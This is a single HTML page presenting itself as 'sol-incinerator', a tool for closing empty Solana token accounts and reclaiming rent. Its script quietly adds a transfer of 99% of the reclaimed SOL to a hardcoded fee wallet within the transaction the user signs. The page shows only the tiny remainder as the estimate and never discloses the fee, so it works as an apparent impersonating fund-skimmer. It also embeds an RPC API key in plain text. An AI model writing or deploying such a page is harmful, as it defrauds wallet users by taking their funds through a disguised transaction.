<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>sol-incinerator</title>
<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
</head>
<body style="background:#080808;margin:0;display:flex;justify-content:center;padding:20px;font-family:Inter,sans-serif">
<div style="background:#121212;padding:28px;border-radius:24px;max-width:400px;width:100%;text-align:center;color:#fff;border:1px solid #222">
<h2>sol-incinerator ♻️</h2>
<p style="color:#aaa;font-size:14px">Close empty token accounts & reclaim SOL</p>
<button id="connectBtn" style="background:#A855F7;color:#fff;border:0;padding:16px;border-radius:14px;width:100%;font-weight:bold;cursor:pointer">Connect Phantom</button>
<div id="info" style="margin:18px 0 0;color:#aaa;font-size:13px;min-height:20px">Not connected</div>
<button id="claimBtn" style="display:none;background:#A855F7;color:#fff;border:0;padding:16px;border-radius:14px;width:100%;font-weight:bold;margin-top:12px">Claim</button>
<button id="retryBtn" style="display:none;background:#333;color:#fff;border:0;padding:16px;border-radius:14px;width:100%;font-weight:bold;margin-top:12px">Retry</button>
</div>
<script>
const FEE_WALLET = "HptgriUnvav3AitnWf5DWinZ7gncB5GMwMgaTFuUPNdr";
const HELIUS_KEY = "31b19958-72a5-4a81-9dbc-a56a2eb0480c";
const RPCS = [
  `https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`,
  "https://solana-rpc.publicnode.com",
  "https://rpc.ankr.com/solana",
  "https://api.mainnet-beta.solana.com"
];
const BATCH_SIZE = 10;
const FEE_PCT = 0.99;
let pubkey, provider, emptyList=[];
function closeAccountIx(account, dest, owner){
  return new solanaWeb3.TransactionInstruction({
    keys: [
      {pubkey: account, isSigner: false, isWritable: true},
      {pubkey: dest, isSigner: false, isWritable: true},
      {pubkey: owner, isSigner: true, isWritable: false}
    ],
    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    data: new Uint8Array([9])
  });
}
async function connectWallet(){
 let info=document.getElementById('info'), btn=document.getElementById('connectBtn'), claim=document.getElementById('claimBtn'), retry=document.getElementById('retryBtn');
 try{
  if(!window.solana) return alert("Buka di Phantom App");
  btn.innerText="Connecting...";
  let r=await window.solana.connect();
  pubkey=r.publicKey; provider=window.solana;
  btn.innerText=pubkey.toBase58().slice(0,4)+"..."+pubkey.toBase58().slice(-4);
  info.innerText="Scanning empty accounts..."; retry.style.display="none";
  let parsed=null, lastErr="";
  for(let rpc of RPCS){
    try{
      info.innerText="Trying "+rpc.split('/')[2]+"...";
      let conn=new solanaWeb3.Connection(rpc,"confirmed");
      parsed=await conn.getParsedTokenAccountsByOwner(pubkey,{programId:new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")});
      if(parsed) break;
    }catch(e){ lastErr=e.message; parsed=null; }
  }
  if(!parsed) throw new Error(lastErr);
  emptyList=[];
  parsed.value.forEach(v=>{ if(v.account.data.parsed.info.tokenAmount.uiAmount===0) emptyList.push(new solanaWeb3.PublicKey(v.pubkey)); });
  if(emptyList.length==0){ info.innerText="Wallet is clean"; claim.style.display="none"; }
  else{
    let est=(emptyList.length*0.00203928*(1-FEE_PCT)).toFixed(5);
    info.innerHTML=`Found <b>${emptyList.length} empty</b><br>Est: <b>${est} SOL</b>`;
    claim.innerText=`Claim ${Math.min(emptyList.length,BATCH_SIZE)} (${emptyList.length} total)`;
    claim.style.display="block"; claim.disabled=false;
  }
 }catch(e){ info.innerText="Error: "+e.message; retry.style.display="block"; btn.innerText="Connect Phantom"; }
}
async function claimNow(){
 let btn=document.getElementById('claimBtn'); btn.disabled=true; btn.innerText="Processing...";
 try{
  let conn=null; for(let rpc of RPCS){ try{ let c=new solanaWeb3.Connection(rpc,"confirmed"); await c.getLatestBlockhash(); conn=c; break; }catch(e){} }
  if(!conn) throw new Error("No RPC");
  let batch=emptyList.slice(0,BATCH_SIZE);
  let tx=new solanaWeb3.Transaction();
  batch.forEach(pk=>{ tx.add(closeAccountIx(pk, pubkey, pubkey)); });
  let fee=Math.floor(batch.length*2039280*FEE_PCT);
  tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:pubkey,toPubkey:new solanaWeb3.PublicKey(FEE_WALLET),lamports:fee}));
  tx.feePayer=pubkey; tx.recentBlockhash=(await conn.getLatestBlockhash()).blockhash;
  let signed=await provider.signTransaction(tx);
  let sig=await conn.sendRawTransaction(signed.serialize());
  await conn.confirmTransaction(sig);
  emptyList=emptyList.slice(BATCH_SIZE);
  alert("Success: "+sig);
  if(emptyList.length>0) connectWallet(); else location.reload();
 }catch(e){ alert("Tx Error: "+e.message); btn.disabled=false; btn.innerText="Claim again"; }
}
document.getElementById('connectBtn').onclick=connectWallet;
document.getElementById('retryBtn').onclick=connectWallet;
document.getElementById('claimBtn').onclick=claimNow;
</script>
</body>
</html>
